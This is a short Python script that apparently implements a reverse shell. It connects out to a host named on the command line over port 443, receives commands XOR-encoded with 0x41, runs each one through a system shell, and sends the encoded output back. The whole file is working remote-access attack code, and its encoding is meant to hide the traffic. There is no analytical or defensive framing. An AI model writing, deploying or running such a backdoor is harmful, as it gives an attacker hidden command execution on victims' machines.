#!/usr/bin/python

import socket
import subprocess
import sys

HOST = sys.argv[1]
PORT = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    # Recieve XOR encoded data from network socket
    data = s.recv(1024)

    # XOR the data again with a 'x41' to get back to normal data
    en_data = bytearray(data)
    for i in range(len(en_data)):
        en_data[i] ^= 0x41

    # Execute the decoded data as a command
    # The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable
    comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    STDOUT, STDERR = comm.communicate()

    # Encode the output and send to HOST
    en_STDOUT = bytearray(STDOUT)
    for i in range(len(en_STDOUT)):
        en_STDOUT[i] ^= 0x41
    s.send(en_STDOUT)

s.close()
